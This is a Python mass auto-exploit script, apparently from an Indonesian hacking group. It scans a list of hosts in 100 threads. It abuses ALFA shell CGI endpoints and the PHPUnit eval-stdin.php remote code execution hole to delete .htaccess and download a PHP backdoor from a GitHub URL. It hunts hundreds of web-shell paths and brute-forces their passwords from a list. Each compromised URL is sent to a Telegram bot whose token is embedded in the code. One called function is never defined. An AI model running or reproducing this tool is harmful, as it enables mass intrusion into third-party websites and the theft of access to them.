import os
import requests
import random
import threading
import time
import sys
import ctypes
import re
import urllib3
from multiprocessing.dummy import Pool, Lock
from requests import post
from bs4 import BeautifulSoup
from random import choice
from colorama import Fore, Style, init

init(autoreset=True)

fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

current_directory = os.path.dirname(os.path.abspath(__file__))
parent_directory = os.path.dirname(current_directory)

def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

Folder(os.path.join(parent_directory, 'result'))

urllib3.disable_warnings()
Good = 0
x = requests.session()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    while True:
        input_file = input("Masukkan nama file input (misalnya, list.txt): ")
        if os.path.exists(input_file):
            break
        else:
            print("File tidak ditemukan. Silakan coba lagi.")

    target = [i.strip() for i in open(input_file, mode='r').readlines()]

def alfa(i) : #ok
    global Good
    x = requests.session()
    head={
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }
    listaa = ['/alfacgiapi','/ALFA_DATA/alfacgiapi','/assets/alfacgiapi','/assets/ALFA_DATA/alfacgiapi','/upload/alfacgiapi','/upload/ALFA_DATA/alfacgiapi','/uploads/alfacgiapi','/uploads/ALFA_DATA/alfacgiapi','/assets/upload/alfacgiapi','/assets/upload/ALFA_DATA/alfacgiapi','/assets/uploads/alfacgiapi','/assets/uploads/ALFA_DATA/alfacgiapi','/wp-content/alfacgiapi','/wp-content/ALFA_DATA/alfacgiapi''/wp-content/uploads/alfacgiapi','/wp-content/uploads/ALFA_DATA/alfacgiapi','/wp-content/plugins/alfacgiapi','/wp-content/plugins/ALFA_DATA/alfacgiapi','/wp-content/themes/alfacgiapi','/wp-content/themes/ALFA_DATA/alfacgiapi','/wp-content/upgrade/alfacgiapi','/wp-content/upgrade/ALFA_DATA/alfacgiapi','/wp-content/updraft/alfacgiapi','/wp-content/updraft/ALFA_DATA/alfacgiapi','/wp-content/plugins/library/alfacgiapi','/wp-content/plugins/library/ALFA_DATA/alfacgiapi','/wp-admin/alfacgiapi','/wp-admin/ALFA_DATA/alfacgiapi','/wp-includes/alfacgiapi','/wp-includes/ALFA_DATA/alfacgiapi','/.well-known/alfacgiapi','/.well-known/ALFA_DATA/alfacgiapi','/.well-known/acme-challenge/alfacgiapi','/.well-known/acme-challenge/ALFA_DATA/alfacgiapi','/.well-known/pki-validation/alfacgiapi','/.well-known/pki-validation/ALFA_DATA/alfacgiapi','/.tmb/alfacgiapi','/.tmb/ALFA_DATA/alfacgiapi','/.quarantine/alfacgiapi','/.quarantine/ALFA_DATA/alfacgiapi','/cgi-bin/alfacgiapi','/cgi-bin/ALFA_DATA/alfacgiapi','/images/alfacgiapi','/images/ALFA_DATA/alfacgiapi','/components/alfacgiapi','/components/ALFA_DATA/alfacgiapi','/wordpress/alfacgiapi','/wordpress/ALFA_DATA/alfacgiapi','/wp/alfacgiapi','/wp/ALFA_DATA/alfacgiapi','/blog/alfacgiapi','/blog/ALFA_DATA/alfacgiapi','/new/alfacgiapi','/new/ALFA_DATA/alfacgiapi','/old/alfacgiapi','/old/ALFA_DATA/alfacgiapi','/backup/alfacgiapi','/backup/ALFA_DATA/alfacgiapi']
    for xox in listaa :
        try :
            url = ("http://"+i+xox+"/perl.alfa")
            url2 = ("http://"+i+xox+"/bash.alfa")
            url3 = ("http://"+i+xox+"/py.alfa")
            check = ("http://"+i+xox+"/index.php?bx=0e215962017")
            check2 = ("http://"+i+xox+"/radio.php?bx=0e215962017")
            check3 = ("http://"+i+xox+"/404.php?bx=0e215962017")
            x.post(url, headers=head, data={'cmd': 'd2dldCAtcU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vdnJ0aG5rbmcvY29rL21haW4vdXA='}, timeout=15)
            x.post(url, headers=head, data={'cmd': 'Y3VybCAtTHMgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL292cnRobmtuZy9jb2svbWFpbi91cCB8IHRlZSAtYSBpbmRleC5waHA='}, timeout=15)
            x.post(url2, headers=head, data={'cmd': 'd2dldCAtcU8gcmFkaW8ucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vdnJ0aG5rbmcvY29rL21haW4vdXA='}, timeout=15)
            x.post(url2, headers=head, data={'cmd': 'Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb3ZydGhua25nL2Nvay9tYWluL3VwIC1vIHJhZGlvLnBocA=='}, timeout=15)
            x.post(url3, headers=head, data={'cmd': 'Y3VybCAtTHMgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL292cnRobmtuZy9jb2svbWFpbi91cCB8IHRlZSAtYSA0MDQucGhw'}, timeout=15)
            x.post(url3, headers=head, data={'cmd': 'd2dldCAtcU8gNDA0LnBocCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb3ZydGhua25nL2Nvay9tYWluL3Vw'}, timeout=15)
            req1 = x.get(check, headers=head, timeout=15)
            if "BandungXploiter" in req1.text :
                Good = Good + 1
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found ALFA RCE")
                open("../result/shell.txt","a").write(check+"\n")
                break
            req2 = x.get(check2, headers=head, timeout=15)
            if "BandungXploiter" in req2.text :
                Good = Good + 1
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found ALFA RCE")
                open("../result/shell.txt","a").write(check2+"\n")
                break
            req3 = x.get(check3, headers=head, timeout=15)
            if "BandungXploiter" in req3.text :
                Good = Good + 1
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found ALFA RCE")
                open("../result/shell.txt","a").write(check3+"\n")
                break
            else :
                print(fw+"["+fr+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found ALFA RCE")
        except :
            pass

def roxy(i) : #scanner biasa
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    listaa = ['/assets/editor/fileman/dev.html','/assets/editor/fileman/index.html','/js/fileman/dev.html','/js/fileman/index.html','/fileman/index.html','/fileman/dev.html','/lib/fileman/index.html','/lib/fileman/dev.html','/admin/fileman/index.html','/admin/fileman/dev.html']
    for xox in listaa :
        try :
            url = ("http://"+i+xox)
            r = x.get(url, headers=head, timeout=15, verify=False)
            if "Roxy file manager" in r.text :
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found RFM")
                open("../result/RFM.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fr+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found RFM")
        except :
            pass

def wpins(i) : #scanner biasa
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    listaa = ['/wp-admin/install.php','/wp/wp-admin/install.php','/wordpress/wp-admin/install.php','/blog/wp-admin/install.php','/new/wp-admin/install.php','/test/wp-admin/install.php','/old/wp-admin/install.php','/backup/wp-admin/install.php']
    for xox in listaa :
        try :
            url = ("http://"+i+xox)
            req = x.get(url, headers=head)
            if "<title>WordPress &rsaquo; Setup Configuration File</title>" in req.text and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req.text :
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found WpSetup")
                open("../result/WpSetUp.txt","a").write(url+"\n")
                break
            elif "<title>WordPress &rsaquo; Installation</title>" in req.text and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req.text :
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found WpInstall")
                open("../result/WpInstall.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fr+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found WPI/WPS")
        except :
            pass

def rsf(i) : #ok
    global Good
    x = requests.session()
    head = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0', 
    'Upgrade-Insecure-Requests': '1', 
    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
    'Accept-Encoding': 'gzip, deflate', 
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 
    'referer': 'www.google.com'
    }
    try :
        listaa = ['un.php','foxx.php','wawe.php','js.php?get','phpinfo.php?re@=vo@','wp-email.php','wp-booking.php','fierza.php','load.php','wp-content/themes/fitnessbase/dev.php','wp-content/themes/fitnessbase/crp.php','alpha.php','tinyfilemanager.php','filemanager.php','manager.php','wp-content.php','wp-content/themes/alera/alpha.php','wp-content/plugins/wp-diambar/includes/loadme.php','lock360.php?daksldlkdsadas=1','5.php','01.php','.well-known/pki-validation/wp-signup.php','.well-known/wp-signup.php','jindex.php','0o.php','ciis.php','zfox.php','zf.php','room.php','xd.php','adriv.php','gecko.php','tonant.php','b.php','xleet-shell.php','4mosan.php','cong.php','config.php','wp-key.php','wp-conctent.php','flame.php','wp-content/flame.php','block-patwp.php','bre.php','lx.php','991176.php','ffAA531.php','wp-help.php','un.php?f=f','un2.php?f=f','wp-posts.php','xl.php','ww.php','testwp.php?wp=1','kyami.php','wp-includes/class-wp-other.php','unknown.php','1975.phP','Mo2AaAaAaPrivateShell.php','god4m.php','tuco.php','x.php','w.php','shl.php','wp-class.php','info.php','o.php','shx.php','l.php','hi.php','readme.php','pi.php','wp-content/themes/noriumportfolio/img_screen.php','wp-content/themes/noriumportfolio/doc.php','wp-content/themes/noriumportfolio/alpha.php','wp-content/themes/noriumportfolio/db.php?u','wp-content/themes/seotheme/db.php?u','wp-content/themes/seotheme/mar.php','wp-content/themes/skatepark/alpha.php','wp-content/themes/skatepark/img_screen.php','wp-content/themes/skatepark/db.php?u','wp-content/themes/skatepark/doc.php','wp-content/plugins/db/mar.php','wp-content/themes/wp-pridmag/22x.php','wp-content/plugins/ndak/1.php','wp-content/plugins/ndak/marijuana.php','wp-content/themes/workart/db.php?u','wp-content/plugins/cakil/up.php','wp-content/plugins/cache-wordpress/wp-activates.php','wp-content/plugins/cache-wordpress/payment.php','wp-content/plugins/cekidot/readme.txt','wp-content/plugins/cekidot/mar.php','wp-content/themes/workart/doc.php','wp-content/themes/theme/gr.php','wp-content/themes/pridmag/init.php','wp-content/themes/jobart/db.php?u','wp-content/themes/jobart/doc.php','wp-content/themes/cepair/doc.php','wp-content/themes/cakiltheme/up.php','wp-content/themes/cakiltheme/idx.php','wp-content/themes/wp-pridmag/status.php','wp-content/themes/wp-pridmag/up.php','wp-content/themes/wp-pridmag/init.php','wp-content/themes/rishi/doc.php','wp-content/plugins/linkpreview/db.php?u','wp-content/themes/rishi/db.php?u','wp-content/plugins/virr/v.php','wp-content/themes/pridmag/db.php?u','wp-content/plugins/virr/uploader.php?uploader','wp-content/plugins/db/uploader.php?uploader','wp-content/plugins/wp-freeform/wawe.php','wp-content/plugins/wp-freeform/includes/loadme.php','wp-content/plugins/wp-freeform/style.php','?loadme','galekjaya.php?raimu=tgl99','r00t.php','Xzd.php','radio.php?pass=shell','content.php','about.php','admin.php','css.php','doc.php','wp_wrong_datlib.php','v.php','ups.php','up.php','fw.php','loader/ff.php?pass=shell','local.php','wp-atom.php','1index.php?pass=shell','2index.php?pass=shell','3index.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','wikindex.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','autoload_classmap.php','wp-conflg.php','wp-admin/includes/1975.php','wp-backup-sql-302.php','wp-includes/wp-class.php','wp-inlcudes.php?katib','wp-js.php?phpshells','wp-load.php?daksldlkdsadas=1','sys.php','0.php','0byte.php','0x0.php','0z.php','1.php','13.php','1877.php','1975.php?CVE=2022','1975.php?CVE=2021','1975.php','1975Team.php?shell=Dead','403.php','404.php','45.php','4x4.php','73.php','a.php','abc.php','al.php','alf.php','alf4.php','alfa-ioxi.php','alfa-shell-v4.php','alfa.php','alfakun.php','alfatesla.php','alfateslav4.php','alwso.php','anjay.php','anon.php','anons79.php','base.php','batm.php','bj.php','black.php','blog/wp-includes/fonts/dev.php','blog/wp-includes/fonts/iqb.php','by.php','byp.php','bypas.php','bypass.php','byps.php','c.php','ccaef.php','chitoge.php','codeboy1877x.php','con.php','con7.php','con7ext.php','dbx.php','defau1t.php','degeselih.php','dev.php','docindex.php','dosya.php','Dz.php','e.php','error.php?phpshells','evil.php','file.php','fox.php','FoxWSO-full.php','FoxWSO.php','foxwso.php','gank.php','gank.php.PhP','gel4y.php','gelay.php','gh.php','hehe.php','i.php','id.php','ids.php','idx.php','indoxploit.php','init.php','ioxi.php','iq.php','iqb.php','k.php','kepo.php','kk.php','kndw1.php','la.php','lnedx.php','lol.php','lolzk.php','m.php','mar.php','marijuana.php','mas.php','mass.php','mclash.php','mi.php','min.php','mini.php','minik.php','minishell.php','mrjn.php','n.php','new-index.php','ninja.php','ohayo.php','old-index.php?daksldlkdsadas=1','olux.php','postfs.php','pref.php','priv.php','priv8.php','qindex.php','r.php','r57.php','rex.php','root.php','s.php','shell.php','shell20211028.php','shells.php','sql.php','srx.php','sym.php','sym403.php','t.php','tes.php','tesla.php','teslav.php','test.php','tshop.php','twin.php','u.php','upload.php','uploader.php','usb.php','usr.php','utchiha.phP','v3.php','v4.php','vuln.php','w3llstore.php','wp-2019.php','wp-admin.php','wp-content/mu-plugins-old/index.php','wp-content/themes/twentytwentytwo/index.php','wp-defaul.php','wp-includes/fonts/dev.php','wp-includes/fonts/iq.php','wp-includes/fonts/iqb.php','wp-info.php','wp-mails.php','wp-one.php','wp-pluging.php','wp-plugins.php','wp-rss.php','wp-singupp.php','wp-site.php','wp-system.php','wp-title.php','wp-we.php','wp.php','wp/wp-includes/fonts/dev.php','wp/wp-includes/fonts/iqb.php','wpindex.php','ws.php','wsanon.php','WSO.php','wso.php','wso1.php','wso1337.php','wso2.php','xcv.php','xidcm.php','xindex.php','xleet.php','xm.php','xx.php','XxX.php','xxx.php','y.php','z.php','zk.php','zone.php?phpshell','zx.php','symlink.php','c99.php','ok.php','2.php','3.php','4.php','6.php','7.php','8.php','9.php','10.php','p.php','q.php','d.php','f.php','g.php','h.php','j.php','wp-wso.php','minimo.php','V3.php','V5.php','www.php','100.php','777.php','xox.php','new.php','wi.php','nee.php','87.php','haxor.php','FoxWSOv1.php','bb.php','lf.php','hello.php','if.php','kn.php','3301.php','anone.php','wp-configer.php','wp-ad.php','send.php','.wp-cache.php','sendmail.php','rahma.php','nasgor.php','alfa123.php']
        for xox in listaa :
            url = ("http://"+i+"/"+xox)
            url2 = ("https://"+i+"/"+xox)
            req = x.get(url, headers=head, timeout=10, verify=False).text
            req = x.get(url2, headers=head, timeout=10, verify=False).text
            if "border:none;background-color:#1e252e;color:#fff;cursor:pointer;" in req or "name='watching' value='submit'" in req or "name='watching' value='>>'" in req or "<form method=post><input type=password name=pass>" in req or "<input type=password name=pass><input type=submit" in req or "method=post>Password:" in req :
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                x.post('https://api.telegram.org/bot5874880100:AAHKOb5XPn7PjAIg3WJ8x9Asc539cOM1m_Y/sendMessage?chat_id=1357193581&text='+url)
                open("../result/shellpw.txt","a").write(url+"\n")
                listpw = ['admin','stusa','xleet','x505','damedesuyo8800','am*guAW8.ryDgz-TYF','Stusa','friv','fuck666','','****','*****','Haxor?1337','haxor','Haxor','imunify1337','Malyo1@8','31337','00w1wcRT','022627raflixsec','123','123456','12qwaszx','1337','133721','1n73ction','22XC','404','555','731','a5e8z77','abcder','achan','adminhoki','aerul','akudimana','alfa','anggie21','AnonGhost','AnonymousFox','asdsdggenu','awokawok2','b374k','b3t4kun','BangPat?1337','banyumas','bheart2206','cantik','cmonqwe123#@!','con7extshell','cyb3r','DapsquaD','DeadSec','default','elena','fff132f70f28194','G00DV1N','geronimo123','gfus','ghost287','HACKED','hacker0882','hackmeDON','Hasilhoki','haurgeulis','haxor34','huypizdaprovoda','hxr1337','iamtheking','IndexAttacker','IndoSec','IndoXploit','JH23FVDG32FD','jupiter2709','katib','kem','kontolcokasu','kontolgaceng','kontoll471','kpxwbYBP4hQK','l o l','leksak98@','letmeinmobile','mad','memes','mini-shell','Mo2a0123','mravast','myrepublic','oppaidragon','password','peler','peler666','Penolong40','phpshell','phpshells','pucek12345','r00t','r00tsh3ll','rbbd95','RFkyy','root','root@kudajumping','Sandra@1199','sys123','T1KUS90T','tbl','thopik123','tunafeesh','w0rms','xmina','zaza','zeeblaxx','{ IndoSec }']
                for pw in listpw :
                    tor = ("http://"+i+"/"+xox+"#"+pw)
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': '>>'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': '>>'}, timeout=7, verify=False).text
                    if "-rw-r--r--" in cek or ">File manager<" in cek or ">Upload file:" in cek or "drwxr-xr-x" in cek or "-rw-rw-rw-" in cek or "drwxrwxrwx" in cek or "Upload File :" in cek or "Writeable" in cek :
                        print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Pass Shell")
                        open("../result/shell.txt","a").write(url+"#"+pw+"\n")
                        open("../result/shellcracked.txt","a").write(url+"#"+pw+"\n")
                        break
                    else :
                        print(fw+"["+fr+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Pass Shell")
                break
            elif ">File manager<" in req or "Cpanel Reset Password" in req or "WebRooT" in req or "PHP File Manager" in req or '<font color="red"><center> Shell :'in req or '<font color="green"><center> Up :' in req or "Haxgeno7" in req or "H3NING_MAL4M" in req or "?x=cmd&d=" in req or "aDriv4" in req or "<input type='submit' value='Submit'" in req or "Upload file :" in req or "uk45" in req or "-rwxrwxrwx" in req or "drwxr-x---" in req or "-rwxr-xr-x" in req or "#0x2525" in req or "#0x2515" in req or "-rw-rw-r--" in req or "Mini Shell" in req or "=== bbPress ===" in req or "Priv8 Home Root Uploader by Mrcakil" in req or "root@indoxploit" in req or "&mode=upload'>Upload file</a></td>" in req or "<input type=file name=f><input name=k type=submit id=k value=upload>" in req or 'name="_upl" type="submit" id="_upl" value="Upload"' in req or "trenggalek6etar" in req or "D3xterR00t" in req or "-r--r--r--" in req or "PHP Uploader - By Phenix-TN & Mr.Anderson" in req or '<option value="/tmp/">' in req or 'name="_upl"' in req and 'id="_upl"' in req and 'value="Upload"' in req or 'Sh3ll' in req or "Sh3ll By Anons79" in req or "CCAEF Uploader" in req or ">Upload file:" in req or "RevoLutioN Namesis" in req or "okokok" in req or 'value="Upload"></form>' in req or '<title>[ RC-SHELL' in req or '<option value="create_symlink">' in req or "Vuln!! patch it Now!" in req or "WSO 4.2.5<" in req or "Ghost Exploiter Team Official" in req or ">PHP File Manager<" in req or "1975 Team" in req or '&upload=gaskan">Upload File<' in req or 'name="_upl"' in req and 'id="_upl"' in req or "-rw-r--r--" in req or "drwxr-xr-x" in req or "-rw-rw-rw-" in req or "drwxrwxrwx" in req or "Owner/Group" in req or ">[ Home Shell ]<" in req or "Upload File : " in req or 'name="uploader" id="uploader"' in req or "l7WADead" in req or '<input type="submit" name="submit" value="Upload">' in req or "(Writeable)" in req or "blackpanther1337" in req :
                Good = Good + 1
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                x.post('https://api.telegram.org/bot5874880100:AAHKOb5XPn7PjAIg3WJ8x9Asc539cOM1m_Y/sendMessage?chat_id=1357193581&text='+url)
                open("../result/shell.txt","a").write(url+"\n")
            else :
                print(fw+"["+fr+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Shell")
    except :
        pass

def phpunit(i) : #ok
    global Good
    head = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try :
        x = requests.session()
        listaa = ['/vendor/phpunit/phpunit/src/Util/PHP/','/laravel/vendor/phpunit/phpunit/src/Util/PHP/','/api/vendor/phpunit/phpunit/src/Util/PHP/','/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/','/modules/autoupgrade/vendor/phpunit/phpunit/src/Util/PHP/']
        for xox in listaa :
            url = ("http://"+i+xox+"eval-stdin.php")
            data = "<?php phpinfo(); ?>"
            cmd = x.get(url, data=data, timeout=15, verify=False)
            if "PHP License as published by the PHP Group" in cmd.text :
                print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Phpunit")
                open("../result/phpunit.txt","a").write(url+"\n")
                data2 = "<?php system('rm .htaccess') ?>"
                x.get(url, data=data2, timeout=15, verify=False)
                data3 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgQoJGNoLCBDVVJMTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgKCWN1cmxfY2xvc2UoJGNoKTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgoKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL292cnRobmtuZy9jb2svbWFpbi91cCIsImluZGV4LnBocCIpKSB7CgllY2hvICJCYW5kdW5nWHBsb2l0ZXIiOwp9IGVsc2UgewoJZWNobyAiZmFpbCI7Cn0KPz4=')); ?>"
                x.get(url, data=data3, timeout=15, verify=False)
                data4 = "<?php system('wget https://raw.githubusercontent.com/ovrthnkng/cok/main/up -qO index.php');"
                x.get(url, data=data4, timeout=15, verify=False)
                data5 = "<?php system('curl -s https://raw.githubusercontent.com/ovrthnkng/cok/main/up -o index.php');"
                x.get(url, data=data5, timeout=15, verify=False)
                url2 = ("http://"+i+xox+"index.php?bx=0e215962017")
                spawn = x.get(url2, headers=head)
                if "BandungXploiter" in spawn.text:
                    Good = Good + 1
                    print(fw+"["+fg+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Phpunit Shell")
                    open("../result/shell.txt","a").write(url2+"\n")
                    break
                else :
                    print(fw+"["+fr+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Vuln Phpunit")
            else :
                print(fw+"["+fr+"chris"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Phpunit")
    except :
        pass


def exploit(i):
    try:
        alfa(i)
        rsf(i)
        phpunit(i)
        roxy(i)
        rfm(i)
        wpins(i)
    except:
        pass

if __name__ == "__main__":
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = """
    _       _      __  __     _     _ _             ___      _     ___         ___ _        _
   /_\ _  _| |_ ___\ \/ /_ __| |___(_) |_ ___ _ _  | _ ) ___| |_  | _ )_  _   / __| |_  _ _(_)___
  / _ \ || |  _/ _ \>  <| '_ \ / _ \ |  _/ -_) '_| | _ \/ _ \  _| | _ \ || | | (__| ' \| '_| (_-<
 /_/ \_\_,_|\__\___/_/\_\ .__/_\___/_|\__\___|_|   |___/\___/\__| |___/\_, |  \___|_||_|_| |_/__/
                        |_|                                            |__/

    \n"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write(" \x1b[1;%dm%s%s\n " % (random.choice(colors), line, clear))
        time.sleep(0.05)
    
    p = Pool(100)
    p.map(exploit, target)
    p.close()
    p.join()
    
    print("\n")
    print(fr+"|-------------------------------------|")
    print(fr+"|             "+fw+"SELESAI"+fr+"             |")
    print(fr+"|-------------------------------------|")
    print(fr+"|                                     |")
    print(fr+"|                                     |")
    print(fr+"|         "+fw+"Alat Auto-Exploit"+fr+"         |")
    print(fr+"|     "+fw+"Dikembangkan oleh Chr"+fr+"}{"+fw+"is"+fr+"     |")
    print(fr+"|                                     |")
    print(fr+"|                                     |")
    print(fr+"|-------------------------------------|")